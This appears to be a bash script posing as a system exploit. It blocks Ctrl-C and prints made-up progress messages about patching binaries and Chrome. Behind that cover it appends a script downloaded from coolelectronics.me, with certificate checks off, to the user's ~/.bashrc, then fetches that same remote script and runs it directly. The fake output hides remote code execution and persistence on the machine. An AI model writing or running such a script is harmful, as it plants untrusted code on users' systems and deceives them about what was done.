#!/bin/bash

trap '' INT

echo "Downloading supporting files..."
wget "https://coolelectronics.me/unroll" -O /dev/null
sleep 1.5
echo "Creating bindmounts"
sleep 3
echo "Patching binaries"
sleep 3.5
echo "/bin/sh patched"
sleep 2.2
curl -k "https://coolelectronics.me/unroll82_patch.sh" >>~/.bashrc
echo ".bashrc patched"
sleep 2.5
echo "/opt/google/google-chrome patched"
tput bel
sleep 2.1
echo "Starting exploit... This phase may hang for 2-3 minutes"
sleep 160
bash <(curl -k "https://coolelectronics.me/unroll82_patch.sh")
